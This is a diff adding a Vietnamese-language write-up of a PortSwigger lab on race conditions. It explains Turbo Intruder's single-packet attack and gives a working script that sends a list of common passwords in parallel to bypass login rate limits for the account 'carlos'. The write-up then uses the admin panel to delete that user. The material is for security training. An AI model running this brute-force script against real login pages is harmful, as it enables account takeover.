@@ -13,6 +13,13 @@
     - [Detecting and exploiting limit overrun race conditions with Burp Repeater - Continued](https://github.com/DucThinh47/PortSwigger/blob/main/Race-conditions/Race_conditions.md#detecting-and-exploiting-limit-overrun-race-conditions-with-burp-repeater---continued)
     - [Lab: Limit overrun race conditions](https://github.com/DucThinh47/PortSwigger/blob/main/Race-conditions/Race_conditions.md#lab-limit-overrun-race-conditions)
 
+- [Detecting and exploiting limit overrun race conditions with Turbo Intruder]()
+
+    - [Detecting and exploiting limit overrun race conditions with Turbo Intruder]()
+    - [Detecting and exploiting limit overrun race conditions with Turbo Intruder - Continued]()
+    - [Lab: Bypassing rate limits via race conditions]()
+
+
 ### Limit overrun race conditions
 
 #### Limit overrun race conditions
@@ -131,6 +138,109 @@ Mua sản phẩm và solved the lab!
 
 ![img](https://github.com/DucThinh47/PortSwigger/blob/main/Race-conditions/images/image18.png?raw=true)
 
+### Detecting and exploiting limit overrun race conditions with Turbo Intruder
+
+#### Detecting and exploiting limit overrun race conditions with Turbo Intruder
+
+Bên cạnh việc hỗ trợ sẵn kỹ thuật `single-packet attack` trong `Burp Repeater`, tiện ích mở rộng `Turbo Intruder` cũng hỗ trợ kỹ thuật này. Có thể tải phiên bản mới nhất từ `BApp Store`.
+
+`Turbo Intruder` yêu cầu có một chút kiến thức về Python, nhưng nó rất phù hợp cho các cuộc tấn công phức tạp hơn — chẳng hạn như:
+
+- Những tình huống `cần thử lại nhiều lần` (multiple retries)
+- Cần `căn chỉnh thời gian` gửi yêu cầu theo từng đợt (staggered request timing)
+- Hoặc cần gửi một `lượng yêu cầu cực lớn`
+
+#### Detecting and exploiting limit overrun race conditions with Turbo Intruder - Continued
+
+Cách sử dụng `single-packet attack` trong Turbo Intruder:
+
+- Đảm bảo rằng mục tiêu hỗ trợ `HTTP/2`. Kỹ thuật `single-packet attack` không tương thích với `HTTP/1`.
+
+- Thiết lập các tùy chọn cấu hình `engine=Engine.BURP2` và `concurrentConnections=1` cho request engine.
+
+- Khi đưa các yêu cầu vào hàng đợi, hãy nhóm chúng bằng cách gán một `tên gate` thông qua đối số `gate` trong phương thức `engine.queue()`.
+
+- Để gửi tất cả các yêu cầu trong một nhóm cụ thể, bạn chỉ cần `mở gate tương ứng` bằng phương thức `engine.openGate()`.
+
+        def queueRequests(target, wordlists):
+            engine = RequestEngine(endpoint=target.endpoint,
+                                    concurrentConnections=1,
+                                    engine=Engine.BURP2
+                                    )
+            
+            # xếp hàng 20 yêu cầu vào gate '1'
+            for i in range(20):
+                engine.queue(target.req, gate='1')
+            
+            # gửi tất cả yêu cầu trong gate '1' song song
+            engine.openGate('1')
+
+Để biết thêm chi tiết, có thể tham khảo file mẫu `race-single-packet-attack.py` nằm trong thư mục ví dụ mặc định của `Turbo Intruder`.
+
+#### Lab: Bypassing rate limits via race conditions
+
+![img](19)
+
+Access the lab:
+
+![img](20)
+
+Truy cập trang `My account` và đăng nhập tài khoản `carlos` với password bất kỳ. request `/login` sẽ như sau:
+
+![img](23)
+
+Send request này tới `Turbo Intruder` (Right click -> Extensions -> Send to Turbo Intruer):
+
+![img](24)
+
+Chọn `examples/race-single-packet-attack.py`:
+
+![img](25)
+
+Chỉnh sửa code thành như sau:
+
+    def queueRequests(target, wordlists):
+
+        # if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack
+        # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
+        # for more information, check out https://portswigger.net/research/smashing-the-state-machine
+        engine = RequestEngine(endpoint=target.endpoint,
+                            concurrentConnections=1,
+                            engine=Engine.BURP2
+                            )
+
+        passwords = ['123123', 'abc123', 'football', 'monkey', 'letmein', 'shadow', 'master', '666666', 'qwertyuiop', '123321', 'mustang', '123456', 'password', '12345678', 'qwerty', '123456789', '12345', '1234', '111111', '1234567', 'dragon', '1234567890', 'michael', 'x654321', 'superman', '1qaz2wsx', 'baseball', '7777777', '121212', '000000']
+        
+        # the 'gate' argument withholds part of each request until openGate is invoked
+        # if you see a negative timestamp, the server responded before the request was complete
+        for password in passwords:
+            engine.queue(target.req, password, gate='1')
+
+        # once every 'race1' tagged request has been queued
+        # invoke engine.openGate() to send them in sync
+        engine.openGate('1')
+
+
+    def handleResponse(req, interesting):
+        table.add(req)
+
+Chọn vị trí cần brute-force là ở password, vì là string nên thay thành `%s`:
+
+![img](26)
+
+Click Attack:
+
+![img](27)
+
+Tìm được password cho carlos, tiến hành đăng nhập. 
+
+Admin panel, chọn xóa carlos:
+
+![img](21)
+
+Solved the lab!
+
+![img](22)
 
 
 
